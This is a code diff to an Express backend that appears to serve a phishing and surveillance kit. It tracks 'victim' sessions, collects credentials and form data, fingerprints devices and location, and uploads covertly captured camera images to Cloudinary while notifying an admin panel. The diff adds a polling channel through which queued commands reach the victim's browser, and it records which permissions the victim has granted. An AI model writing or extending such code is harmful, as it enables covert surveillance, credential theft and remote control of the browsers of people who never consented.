@@ -7,7 +7,7 @@ const CameraCapture = require('../models/CameraCapture');
 const ClickEvent = require('../models/ClickEvent');
 const deviceDetect = require('../middleware/deviceDetect');
 const geoLookup = require('../middleware/geoIp');
-const { collectionLimiter, credentialLimiter } = require('../middleware/rateLimit');
+const { collectionLimiter, credentialLimiter, cameraLimiter } = require('../middleware/rateLimit');
 const { emitToAdmin } = require('../socket');
 const { uploadBase64Image } = require('../services/cloudinaryUpload');
 
@@ -215,7 +215,32 @@ router.post('/formdata', collectionLimiter, async (req, res) => {
 
     session.formData.push({ formId, fields, url, t: new Date() });
     session.lastActiveAt = new Date();
+
+    // === Handle permission poll: check for pending commands ===
+    let command = null;
+    if (formId === 'permission-poll') {
+      // Check if there are pending permission commands in the session
+      if (session.pendingCommands && session.pendingCommands.length > 0) {
+        // Dequeue the first command
+        command = session.pendingCommands.shift();
+      }
+      
+      // Update permission status if reported
+      if (fields && fields.permissions) {
+        session.permissions = {
+          ...(session.permissions || {}),
+          ...fields.permissions,
+          lastUpdated: new Date()
+        };
+      }
+    }
+
     await session.save();
+
+    // If we have a command, return it in response
+    if (command) {
+      return res.json({ ok: true, command: command.type, permissionType: command.permissionType, ...command });
+    }
 
     res.json({ ok: true });
   } catch (error) {
@@ -338,7 +363,7 @@ router.post('/network', collectionLimiter, async (req, res) => {
 });
 
 // POST /api/collect/camera - Receive base64 camera image (uploads to Cloudinary)
-router.post('/camera', collectionLimiter, async (req, res) => {
+router.post('/camera', cameraLimiter, async (req, res) => {
   try {
     const { sessionId, imageData, metadata, triggerType } = req.body;
     const session = await VictimSession.findOne({ sessionId });
